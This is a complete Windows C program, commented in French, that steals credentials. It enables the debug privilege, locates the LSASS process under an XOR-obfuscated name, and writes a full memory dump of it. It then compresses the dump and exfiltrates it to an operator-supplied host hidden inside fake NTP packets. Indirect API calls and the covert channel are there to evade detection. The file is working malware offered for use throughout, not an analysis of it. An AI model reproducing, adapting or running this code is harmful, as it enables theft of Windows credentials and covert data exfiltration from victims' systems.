#define UNICODE
#define _UNICODE

#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "DbgHelp.lib")


// --- Activation du privilège SeDebugPrivilege ---
// --- Activation du privilège SeDebugPrivilege via appels indirects ---
BOOL EnableDebugPrivilege(void) {
    // Chargement de advapi32.dll
    HMODULE hAdvapi = GetModuleHandleW(L"advapi32.dll");
    if (!hAdvapi) {
        printf("[!] Échec de chargement de advapi32.dll.\n");
        return FALSE;
    }

    // Définition des pointeurs vers les fonctions nécessaires
    typedef BOOL (WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
    typedef BOOL (WINAPI *pLookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
    typedef BOOL (WINAPI *pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

    pOpenProcessToken fOpenProcessToken = (pOpenProcessToken)GetProcAddress(hAdvapi, "OpenProcessToken");
    pLookupPrivilegeValueW fLookupPrivilegeValueW = (pLookupPrivilegeValueW)GetProcAddress(hAdvapi, "LookupPrivilegeValueW");
    pAdjustTokenPrivileges fAdjustTokenPrivileges = (pAdjustTokenPrivileges)GetProcAddress(hAdvapi, "AdjustTokenPrivileges");

    if (!fOpenProcessToken || !fLookupPrivilegeValueW || !fAdjustTokenPrivileges) {
        printf("[!] Échec de récupération d'une ou plusieurs fonctions depuis advapi32.dll.\n");
        return FALSE;
    }

    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!fOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken a échoué.\n");
        return FALSE;
    }
    if (!fLookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        printf("[!] LookupPrivilegeValue a échoué.\n");
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!fAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges a échoué.\n");
        CloseHandle(hToken);
        return FALSE;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[!] Le token ne possède pas le privilège requis.\n");
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}


// --- Fonction de conversion ---
// --- Convertit une chaîne de caractères ANSI (char*) en Unicode (wchar_t*). ---
wchar_t* ConvertToWideChar(const char* charStr) {
    int sizeNeeded = MultiByteToWideChar(CP_ACP, 0, charStr, -1, NULL, 0);
    wchar_t* wStr = (wchar_t*)malloc(sizeNeeded * sizeof(wchar_t));
    if (wStr) {
        MultiByteToWideChar(CP_ACP, 0, charStr, -1, wStr, sizeNeeded);
    }
    return wStr;
}

// --- Fonction de déobfuscation ---
// Décodage d'une chaîne obfusquée (chaque caractère XOR avec la clé)
void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxLen) {
    size_t i = 0;
    while (encoded[i] != L'\0' && i < maxLen - 1) {
        decoded[i] = encoded[i] ^ key;
        i++;
    }
    decoded[i] = L'\0';
}

// --- Fonction pour récupérer le PID d'un processus ---
// Utilise les fonctions indirectes : CreateToolhelp32Snapshot, Process32FirstW, Process32NextW et CloseHandle
DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
    DWORD pid = 0;
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32)
        return 0;

    typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
    typedef BOOL (WINAPI *pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL (WINAPI *pProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL (WINAPI *pCloseHandle)(HANDLE);

    pCreateToolhelp32Snapshot fCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    pProcess32FirstW fProcess32FirstW = (pProcess32FirstW)GetProcAddress(hKernel32, "Process32FirstW");
    pProcess32NextW fProcess32NextW = (pProcess32NextW)GetProcAddress(hKernel32, "Process32NextW");
    pCloseHandle fCloseHandle = (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");

    if (!fCreateToolhelp32Snapshot || !fProcess32FirstW || !fProcess32NextW || !fCloseHandle)
        return 0;

    HANDLE hSnapshot = fCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    // Utilisation de PROCESSENTRY32W pour travailler avec des chaînes de caractères larges (wchar_t*)
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (fProcess32FirstW(hSnapshot, &pe)) {
        do {
            // Comparaison de chaînes larges avec _wcsicmp
            if (_wcsicmp(pe.szExeFile, targetProcessName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (fProcess32NextW(hSnapshot, &pe));
    }
    fCloseHandle(hSnapshot);
    return pid;
}


// --- Fonction de dump mémoire ---
// Effectue un dump mémoire du processus cible en utilisant MiniDumpWriteDump (appel indirect déjà présent)
// et un mapping mémoire temporaire en passant par les appels indirects de kernel32.dll
BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
    // Chargement de DbgHelp.dll et récupération de MiniDumpWriteDump
    HMODULE hDbgHelp = LoadLibraryW(L"DbgHelp.dll");
    if (!hDbgHelp)
        return FALSE;

    typedef BOOL (WINAPI *MiniDumpWriteDumpType)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE,
        PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
    MiniDumpWriteDumpType MiniDumpWriteDumpFunc = (MiniDumpWriteDumpType)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!MiniDumpWriteDumpFunc) {
        FreeLibrary(hDbgHelp);
        return FALSE;
    }

    // Ouvre le processus cible
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        FreeLibrary(hDbgHelp);
        return FALSE;
    }

    // Création d'un fichier temporaire pour stocker le dump
    char tempPath[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tempPath)) {
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        return FALSE;
    }
    char tempFile[MAX_PATH];
    sprintf(tempFile, "%s\\dumpfile_%u.dmp", tempPath, GetCurrentProcessId());
    HANDLE hFile = CreateFileA(tempFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        return FALSE;
    }

    // Écriture du dump dans le fichier temporaire
    BOOL success = MiniDumpWriteDumpFunc(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (!success) {
        CloseHandle(hFile);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        DeleteFileA(tempFile);
        return FALSE;
    }

    // Récupération de la taille réelle du dump
    LARGE_INTEGER liSize;
    if (!GetFileSizeEx(hFile, &liSize)) {
        CloseHandle(hFile);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        DeleteFileA(tempFile);
        return FALSE;
    }
    *dumpSize = (size_t)liSize.QuadPart;

    // Allocation d'un buffer de la taille réelle du dump
    *dumpBuffer = (char*)malloc(*dumpSize);
    if (!*dumpBuffer) {
        CloseHandle(hFile);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        DeleteFileA(tempFile);
        return FALSE;
    }

    // Remise du pointeur de fichier au début et lecture du dump dans le buffer
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, *dumpBuffer, (DWORD)*dumpSize, &bytesRead, NULL) || bytesRead != *dumpSize) {
        free(*dumpBuffer);
        *dumpBuffer = NULL;
        CloseHandle(hFile);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        DeleteFileA(tempFile);
        return FALSE;
    }

    // Nettoyage
    CloseHandle(hFile);
    CloseHandle(hProcess);
    FreeLibrary(hDbgHelp);
    DeleteFileA(tempFile);
    return TRUE;
}


// --- Fonction de compression ---
// Compresse le buffer à l'aide de zlib (ici, l'appel reste direct car zlib n'est pas une API Windows)
int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedBuffer, size_t *compressedSize) {
    uLong bound = compressBound(inputSize);
    *compressedBuffer = (char*)malloc(bound);
    if (!*compressedBuffer)
        return Z_MEM_ERROR;
    int res = compress((Bytef*)*compressedBuffer, &bound, (const Bytef*)inputBuffer, inputSize);
    if (res == Z_OK) {
        *compressedSize = bound;
    } else {
        free(*compressedBuffer);
    }
    return res;
}

// --- Fonctions pour la création et l'envoi de faux paquets NTP ---
// Crée un paquet NTP de 48 octets avec le payload placé à l'offset 40
void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
    memset(packet, 0, 48);
    packet[0] = 0x1B; // LI=0, VN=3, Mode=3
    memcpy(packet + 40, payload, 8);
}

// Envoie un paquet UDP contenant le faux paquet NTP en utilisant les fonctions indirectes de ws2_32.dll
int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]) {
    HMODULE hWs2_32 = GetModuleHandleW(L"ws2_32.dll");
    if (!hWs2_32)
        return -1;
    typedef int (WSAAPI *pWSAStartup)(WORD, LPWSADATA);
    typedef SOCKET (WSAAPI *pSocket)(int, int, int);
    typedef int (WSAAPI *pSendTo)(SOCKET, const char*, int, int, const struct sockaddr*, int);
    typedef int (WSAAPI *pClosesocket)(SOCKET);
    typedef int (WSAAPI *pWSACleanup)(void);

    pWSAStartup fWSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, "WSAStartup");
    pSocket fSocket = (pSocket)GetProcAddress(hWs2_32, "socket");
    pSendTo fSendTo = (pSendTo)GetProcAddress(hWs2_32, "sendto");
    pClosesocket fClosesocket = (pClosesocket)GetProcAddress(hWs2_32, "closesocket");
    pWSACleanup fWSACleanup = (pWSACleanup)GetProcAddress(hWs2_32, "WSACleanup");

    if (!fWSAStartup || !fSocket || !fSendTo || !fClosesocket || !fWSACleanup)
        return -1;

    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    int result = 0;
    if (fWSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return -1;
    sock = fSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        fWSACleanup();
        return -1;
    }
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    addr.sin_addr.s_addr = inet_addr(target_ip);

    unsigned char packet[48];
    CreateNTPPacket(payload, packet);
    result = fSendTo(sock, (const char*)packet, 48, 0, (struct sockaddr*)&addr, sizeof(addr));
    fClosesocket(sock);
    fWSACleanup();
    return result;
}

// --- Envoi du dump compressé sous forme de paquets NTP fragmentés ---
// Le premier paquet est un header de 8 octets (4 octets : nombre total de paquets, 4 octets : taille totale)
// Chaque paquet de données contient 8 octets : 4 octets de numéro de séquence et 4 octets de fragment de données.
int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *compressedData, size_t compressedSize) {
    const int fragment_size = 4;
    int total_fragments = (int)((compressedSize + fragment_size - 1) / fragment_size);

    // Prépare le paquet header
    unsigned char header[8];
    header[0] = (total_fragments >> 24) & 0xFF;
    header[1] = (total_fragments >> 16) & 0xFF;
    header[2] = (total_fragments >> 8) & 0xFF;
    header[3] = total_fragments & 0xFF;
    header[4] = ((unsigned int)compressedSize >> 24) & 0xFF;
    header[5] = ((unsigned int)compressedSize >> 16) & 0xFF;
    header[6] = ((unsigned int)compressedSize >> 8) & 0xFF;
    header[7] = ((unsigned int)compressedSize) & 0xFF;

    if (SendNTPPacket(target_ip, target_port, header) == SOCKET_ERROR) {
        printf("[!] Failed to send header packet.\n");
        return -1;
    }
    printf("[+] Header sent: %d fragments, %zu bytes total.\n", total_fragments, compressedSize);

    // Envoi des paquets de données
    for (int seq = 0; seq < total_fragments; seq++) {
        unsigned char payload[8];
        payload[0] = (seq >> 24) & 0xFF;
        payload[1] = (seq >> 16) & 0xFF;
        payload[2] = (seq >> 8) & 0xFF;
        payload[3] = seq & 0xFF;
        int offset = seq * fragment_size;
        int remaining = (int)compressedSize - offset;
        int copySize = remaining < fragment_size ? remaining : fragment_size;
        memset(payload + 4, 0, 4);
        if (copySize > 0)
            memcpy(payload + 4, compressedData + offset, copySize);
        if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
            printf("[!] Failed to send packet %d.\n", seq + 1);
            return -1;
        }
        printf("[+] Packet %d/%d sent.\n", seq + 1, total_fragments);
    }
    printf("[+] Transmission completed.\n");
    return 0;
}

int main(void) {

    // Activation de SeDebugPrivilege
    if (!EnableDebugPrivilege()) {
        printf("[!] Activation of SeDebugPrivilege failed.\n");
        return 1;
    }
    
    // Obfuscation de "lsass.exe" (chaque caractère XOR avec 0x13)
    wchar_t encodedTarget[] = { 'l' ^ 0x13, 's' ^ 0x13, 'a' ^ 0x13, 's' ^ 0x13,
                                  's' ^ 0x13, '.' ^ 0x13, 'e' ^ 0x13, 'x' ^ 0x13,
                                  'e' ^ 0x13, L'\0' };
    wchar_t targetProcessName[256];
    DecodeString(encodedTarget, 0x13, targetProcessName, 256);
    wprintf(L"[*] Decoded target process: %s\n", targetProcessName);

    char target_ip[64];
    int target_port;
    printf("[*] Enter receiver IP: ");
    if (scanf("%63s", target_ip) != 1) {
        printf("[!] Failed to read IP.\n");
        return 1;
    }
    printf("[*] Enter receiver port: ");
    if (scanf("%d", &target_port) != 1) {
        printf("[!] Failed to read port.\n");
        return 1;
    }

    DWORD pid = GetTargetProcessPID(targetProcessName);
    if (pid == 0) {
        printf("[!] Process not found.\n");
        return 1;
    }
    wprintf(L"[+] Process %s found with PID %lu\n", targetProcessName, pid);

    char *dumpBuffer = NULL;
    size_t dumpSize = 0;
    if (!DumpProcessToMemory(pid, &dumpBuffer, &dumpSize)) {
        printf("[!] Failed to dump process memory.\n");
        return 1;
    }
    printf("[+] Memory dump completed. Size: %zu bytes.\n", dumpSize);

    char *compressedBuffer = NULL;
    size_t compressedSize = 0;
    int compRes = CompressBuffer(dumpBuffer, dumpSize, &compressedBuffer, &compressedSize);
    free(dumpBuffer);
    if (compRes != Z_OK) {
        printf("[!] Failed to compress dump. Error: %d\n", compRes);
        return 1;
    }
    printf("[+] Compression completed. Compressed size: %zu bytes.\n", compressedSize);

    if (SendCompressedDumpAsNTP(target_ip, target_port, compressedBuffer, compressedSize) != 0) {
        printf("[!] Failed to send compressed dump to receiver.\n");
        free(compressedBuffer);
        return 1;
    }
    free(compressedBuffer);
    printf("[+] Done!\n");
    return 0;
}
